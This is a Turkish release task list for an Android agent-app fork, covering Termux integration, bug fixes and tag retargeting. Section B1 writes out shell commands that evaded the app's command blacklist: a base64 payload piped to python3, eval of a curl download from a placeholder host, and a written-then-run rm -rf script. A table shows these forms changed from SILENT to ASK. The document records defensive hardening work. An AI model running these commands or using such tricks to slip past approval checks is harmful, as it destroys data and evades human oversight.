# SIRADAKİ SÜRÜM — `37098` / `1.15-ozel.17` · iş listesi

**Tek bekleyen sürüm bu.** `.16` yayınlanmadı, `.17`'ye katlandı: yayın tek
seferde yapılacak, iki ayrı bekleyen sürüm tutmak yanıltıcı.

> Kural: bir sürüm yayınlandığında bu dosya **yeniden yazılır**, üstüne
> eklenmez. Geçmiş: `docs/ozel/DEGISIKLIK-GUNLUGU-11-16.md`.

---

## A0 · Termux katmanı — kullanıcı isteği, öncelik 1

**Tasarım:** `docs/ozel/TERMUX-ENTEGRASYONU.md` (ölçümler, T1–T10 test matrisi,
reddedilen seçenekler).

| Faz | İş | Durum |
|---|---|---|
| **P1** ✅ | `TermuxLayer` (karar mantığı) + 3 risk kuralı + 15 test + korpus 9 satır | ✅ |
| **P2** ✅ | `PRootKernel`: `-b /system -b /apex` (koşullu) + PATH öneki + `refreshTermuxPath` | ✅ |
| **P2** ✅ | `RootfsManager.USER_TREES` += `data/data/com.termux` | ✅ |
| **P2** ✅ | `TermuxInstaller` (10 adım, tekrar başlatılabilir, sabit sha256, zip-slip, SYMLINKS.txt) | ✅ |
| **P2** ✅ | `TermuxPrompt` — modelin katmanı bilmesi (istemsiz araç = özellik yok) | ✅ |
| **P3** ✅ | Kart zaten `Installing(line)` gösteriyor (mevcut `ToolchainScreen` akışı) | ✅ |
| **P3** ✅ | Terminal başlığında katman rozeti (`Terminal · TERMUX`, `remember` içinde) | ✅ |
| **P4** | `sshd` anahtar tabanlı, parola kapalı, 30 dk otomatik kapanma | ⬜ |
| **P5** | Ölçüm tablosunu doldur (kurulum süresi, RAM, `apt update` boyutu) | ⬜ |

**P2'de en kolay atlanan ve en pahalı olan:** `USER_TREES`. `.10.1`'de aynı hata
yaşandı — rootfs yeniden çıkarılınca 1,4 GB'lık araç zinciri silinmişti.
`.17`'de bu satır **yazıldı**; silinmemesi için gerekçesi de yorumda.

**P2 bitti.** Yedi gerçek hata bulundu ve kapatıldı — hepsi
`docs/ozel/DENETIM-37098.md`'de kanıtıyla. En kritik ikisi: bootstrap kök
dizine açılıyordu (Alpine'in `/bin`'ini ezerdi) ve kurulum `boot()` yapmadan
proot çağırıyordu.

**P3 bitti.** Kart `Installing(line)` yayıyor (mevcut akış), terminal başlığı
katman rozetini taşıyor. İkinci turda iki sinsi daha kapatıldı:
`LD_LIBRARY_PATH` üzerine yazımı (proot kendi yükleyicisini kaybederdi) ve
`alpine-rootfs` adının sekiz yerde elle yazılmış olması. Ayrıntı:
`DENETIM-37098.md` §14. Kalan: **P4** (`sshd`) ve **P5** (ölçümler).

---

## A0b · düzeltme turu `37099` — kapandı

Dokuz gerçek hata, altısı sessiz. Kanıt: `docs/ozel/DENETIM-37099.md`.

| # | Sınıf | Hata | Durum |
|---|---|---|---|
| 1 | **sessiz** | `SYMLINKS.txt` sırası tersti (`hedef←bağ`; soldaki hedef, kod bağ sanıyordu) → `bash` kütüphane bulamaz | ✅ |
| 2 | güvenlik | Beş kaçış biçimi SESSİZ geçiyordu (B1) | ✅ |
| 3 | **sessiz** | Komut başı çapası `(^|[\s;&\|])` tırnak önünde eşleşmiyordu → `bash -c "rm -rf …"` kurala uymuyordu | ✅ |
| 4 | **sessiz** | `rg "rm -rf"` araması DENY oluyordu | ✅ |
| 5 | **sessiz** | 71 yeni anahtarın Türkçesi yoktu; üç kapı da yeşildi | ✅ |
| 6 | eşzamanlılık | `ChatHealthBridge.publish` atomik değil → paralel oturumda çip kaybolur | ✅ |
| 7 | görsel | Termux satırı Java'nın ikonunu/grubunu alıyordu (varsayılan dal) | ✅ |
| 8 | birim | "Tüm gruplar kurulursa" toplamına Termux'un **indirme** boyutu giriyordu | ✅ |
| 9 | **sessiz** | Açma adımı her denemede 3 779 dosyayı yeniden yazıyordu | ✅ |

Yeni kapılar: `ceviri-denetim.py` + `apk-butce.py` → `ozel-guard.yml`.

---

## A0c · Termux: katman mı, ayrı APK mı — **karar verildi**

Karar belgesi: `docs/ozel/TERMUX-APK-KARARI.md`.

**Sonuç:** Termux araç zincirleri listesinde tek satır kalır ve tek dokunuşla
kurulur — ama **ayrı APK olarak değil, kendi kökümüzün içinde katman** olarak.
Ayrı APK, "ajanın tüm Termux dosya ve kütüphanelerini kullanması" hedefini
`/data/data/com.termux` başka uid'e kapalı olduğu için **root şartına** bağlar.
Kök-içi katman aynı şeyi root'suz verir.

APK'nın gerçekten eklediği tek sınıf: `termux-api` ve Android yardımcıları.
Onun için de kendi eklenti APK'mızı yazmak yanlış (Termux eklentileri aynı
imzayı ister); doğru yol mevcut Termux'un `RUN_COMMAND` intent API'sine
bağlanmak (`allow-external-apps=true` + izin + `echo` gidiş-dönüşü).

`Termux:SU` diye bir bileşen **yok**: root için olan şey Termux içindeki `tsu`
paketi, root'suz cihazda hiçbir şey yapmaz.

**P4'e eklenen iki iş (karardan çıkan):**
1. **Ön kontrol.** `refresh()` bionic'i yoklamıyor; desteklemeyen cihazda satır
   yine "Kur" diyor ve kullanıcı 32 MB'ı indirdikten **sonra** öğreniyor.
   Doğrusu: `TermuxLayer.probe()` ekran açılırken koşsun, durum `Failed` değil
   **`Unavailable(sebep)`** olsun.
2. **APK köprüsü (isteğe bağlı).** `com.termux` kurulu mu ·
   `allow-external-apps` açık mı · `RUN_COMMAND` dönüyor mu — üçü ölçülsün.

---

## A1 · Yayın öncesi — kapanmalı

Kimlik `.14`'ten beri sabit: `com.minis.x` / **Minis X**.

### A2 · Etiketlerin yeniden hedeflenmesi — **karar bekliyor**
`v1.15-ozel.11.3.1`, `.11.4`, `.13`, `.14`, `.15` etiketlerinin **beşi de**
`ffeb948` (`11.2` / 37029) commit'ini gösteriyor. Release nesneleri doğru APK'yı
taşıyor; yanlış olan etiket → commit bağı.

Neden bloklayıcı: `RELEASE_REPO` bu çatala bakıyor. Kullanıcı ya "güncelleme
yok" görür ya da 37029 indirilir; Android düşük `versionCode`'u reddeder ve
açıklamasız "Uygulama yüklenemedi" çıkar.

Plan hazır, uygulanmadı (uzak etiket silme geri dönüşsüz):
```bash
python3 scripts/ozel/tag-denetim.py --fix-plan
```

| Etiket | Doğru commit | versionCode |
|---|---|---|
| `v1.15-ozel.11.3.1` | `98c8f10` | 37030 |
| `v1.15-ozel.11.4` | `db2566e` | 37033 |
| `v1.15-ozel.13` | `241b470` | 37090 |
| `v1.15-ozel.14` | `73ba3ed` | 37091 |
| `v1.15-ozel.15` | `db55d4c` | 37092 |

### A3 · CI'da üç yeni test ilk kez koşacak
`RiskCorpusTest`, `ApprovalInboxTest`, `TermuxLayerTest`. Bu cihazda JVM başlamadığı için hiç
koşmadılar. Kırmızı çıkarlarsa **sürüm çıkmamalı** — `apk.yml`'deki
`needs: tests` bunu zorunlu kılıyor ama `ozel-guard.yml` de artık korpusu
saniyeler içinde denetliyor.

### A4 · `ozel-guard.yml` ilk koşu
Yeni iş. Üç kontrol: korpus, yapı, etiket. A2'nin aksine **dakikalar değil
saniyeler** sürüyor. İlk koşuda kırmızı olursa hangi kontrol olduğunu adıyla
söylüyor.

---

## B. Ölçülmüş, henüz kapatılmamış boşluklar

### B1 · Kara listenin yapısal sınırı — **çağrı düzeyinde kapandı**

`.16` üç somut kaçış yolunu kapattı ama sınıf kapanmadı. `37099`'da sınıf
**çağrı düzeyinde** kapatıldı: artık "kabuğa kod vermek" her biçimde kart açar.

```bash
echo "aW1wb3J0IHNodXRpbDs..." | base64 -d | python3   # kod metinde değil
eval "$(curl -s https://x/y.sh)"                      # kod uzakta
printf 'rm -rf /var/minis/shared' > /tmp/a.sh && bash /tmp/a.sh
```

| Komut | `37098` | `37099` |
|---|---|---|
| `curl … \| bash` | SILENT | **ASK** (`shell:pipe-to-shell`) |
| `eval "$(…)"` | SILENT | **ASK** (`shell:eval`) |
| `bash x.sh` / `sh -s` | SILENT | **ASK** (`shell:script-file` / `shell:stdin-shell`) |
| `source x.sh` | SILENT | **ASK** (`shell:source`) |
| `bash -c "rm -rf …"` | SILENT | **ASK** (`shell:rm-recursive`) |

**Kalan gerçek boşluk:** içerik metinden çözülemiyor — `base64 -d | python3`
satırı kart açar ama *ne* çalıştırdığını söyleyemez. Doğru cevap kara listeyi
büyütmek değil, **gerçek sandbox** (seccomp/landlock): `write` iznini
`isScratch ∪ isTemp` ile sınırla. Mimari iş, ayrı sürüm.

### B2 · `mv` hedefi çözülemediğinde
`.16` bunu HIGH'tan MEDIUM'a çekti (göreli yol oturum dizininde kalır). Ama
`mv $DEGISKEN /var/minis/shared` gibi bir komutta hedef **yazma** yönüdür ve
tahmin edilemez. Kural: `mv`'nin **ikinci** argümanı da hedef sayılmalı.

### B3 · Compare koşuları `TeamRunStore`'a yazılmıyor
`TeamRunStore.record` `CouncilOutcome` alıyor; Compare'ın claim/konsensüsü yok.
Sahte boş konsensüs uydurmak yerine kayıt hiç yazılmamış (doğru karar), ama
sonuç: **Compare geçmişi yok**. Doğru çözüm `TeamRunStore`'a ikinci bir kayıt
biçimi (`FanoutOutcome`) eklemek.

### B4 · `ChatHealthBridge` yalnız Canlı Görevler'de
Üst çubuk (sohbetin kendisi) ikinci tüketici. Köprü hazır; `ChatScreen`'e chip
eklemek ayrı iş. Ölçüt: chip 96dp'yi geçmemeli (bkz. `UY` sözleşmesi).

---

## C. Belgeler (Termux sonrası)

### C1 · `FORK.md` §5/§6 `.10` anlatıyor
Kimlik `.14`'te (`com.minis.x`), sürüm şeması `.13`'te (37090+) değişti.
Bu bölümler yanlış bilgi taşıyor. `.16`'da dokunulmadı: yarım düzeltme
yanlıştan kötü. Tek seferde, ölçerek yeniden yazılmalı.

### C2 · `docs/ozel/IS-LISTESI-2026-11-20.md` ve eski denetim belgeleri
Aynı gün üç farklı plan dosyası var. Biri (`SIRADAKI-SURUM.md`) tek kaynak
olmalı; diğerleri `arsiv/`'e taşınmalı.

---

## Yapılmayacaklar

- iOS derlemesi (macOS/Xcode ister).
- Upstream'de zaten olan özelliklerin yeniden yazımı.
- `ui/station/` — paneller ayrı sürüm; o gelene kadar `STATION` satırı da yok.
- `37090` uzaktan konsol — jeton modeli var, sunucu yok; ürün kararı bekliyor.
